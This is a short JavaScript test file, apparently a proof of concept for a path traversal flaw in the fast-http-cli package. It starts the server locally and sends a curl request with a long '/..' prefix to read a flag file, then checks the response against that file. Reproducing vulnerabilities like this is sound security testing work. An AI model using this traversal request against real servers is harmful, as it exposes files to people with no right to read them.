//
const path = require("path");
const { sleep } = require("sleep");
const pathToFlag = path.resolve(__dirname, "../flag.html");

function genstr(n) {
  return "/..".repeat(50) + pathToFlag;
}

test("Path Traversal in fast-http-cli", (done) => {
    const fs = require("fs");
    const sleep =require('sleep');
    const { exec } = require("child_process");
    let hostsFile = fs.readFileSync(pathToFlag).toString();

    let server = 'node ./node_modules/fast-http-cli/fast-http.js -p 8892'; //to start the server
    let exe=exec(server, (error, stdout) => {});//starting the server

    sleep.sleep(2);
    let attack_string = `curl -v --path-as-is "http://127.0.0.1:8892${genstr()}"`;

    exec(attack_string, (error, stdout) => {//attack
      expect(stdout).toBe(hostsFile);
      

      done();
    });
    
});
